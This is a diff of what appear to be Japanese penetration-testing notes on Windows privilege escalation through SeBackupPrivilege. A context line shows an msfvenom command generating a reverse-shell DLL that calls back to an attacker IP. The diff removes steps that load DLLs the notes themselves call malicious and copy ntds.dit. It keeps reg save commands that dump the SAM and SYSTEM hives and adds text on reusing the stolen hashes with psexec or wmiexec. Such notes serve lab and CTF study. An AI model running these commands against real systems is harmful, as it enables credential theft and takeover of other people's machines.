@@ -292,38 +292,13 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attack ip> LPORT=1337 -f dll -o
 
 # SeBackupPrivilege
 
-SeBackupPrivilege は、オブジェクトのセキュリティ設定に関係なく、ユーザーまたはプロセスにファイルとディレクトリを読み取る権限を持つ。この権限は、通常ユーザーがアクセスできないファイルをバックアップまたはコピーする機能を必要とする特定のバックアッププログラムまたはプロセスで使用できる。
-
-[SeBackupPrivilege](https://github.com/giuliano108/SeBackupPrivilege/tree/master) ここから悪意のある２つのdll `SeBackupPrivilegeUtils.dll`, `SeBackupPrivilegeCmdLets.dll`をダウンロードし、アップロードする
+SeBackupPrivilege は、オブジェクトのセキュリティ設定に関係なく、ユーザーまたはプロセスにファイルとディレクトリを読み取る権限を持つ。この権限は、通常ユーザーがアクセスできないファイルをバックアップまたはコピーする機能を必要とする特定のバックアッププログラムまたはプロセスで使用できる。主に、レジストリからローカル管理者アカウントのパスワードハッシュを読み取るために使用され、その後、ハッシュを使用して「`psexec`」や「`wmiexec`」などのツールを使用できる(`Pass-the-Hash`)。
 
 ## 権限の悪用
-
-dllを読み込ませる
-
-```
-Import-Module .\SeBackupPrivilegeUtils.dll
-Import-Module .\SeBackupPrivilegeCmdLets.dll
-```
-
-権限を有効にする
-
-```
-Set-SeBackupPrivilege
-Get-SeBackupPrivilege
-```
-
-### 機密ファイルのコピーと読み取り
-
-```
-Copy-FileSeBackupPrivilege C:\Users\Administrator\proof.txt C:\Users\Public\proof.txt -Overwrite
-```
 
 ### パスワードハッシュを取得する
 
 ```
-Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\tmp\ntds.dit -overwrite
-Copy-FileSeBackupPrivilege h:\windows\ntds\ntds.dit c:\tmp\ntds.dit -overwrite
-
 reg save HKLM\SYSTEM c:\tmp\system
 reg save HKLM\SAM C:\tmp\sam
 ```
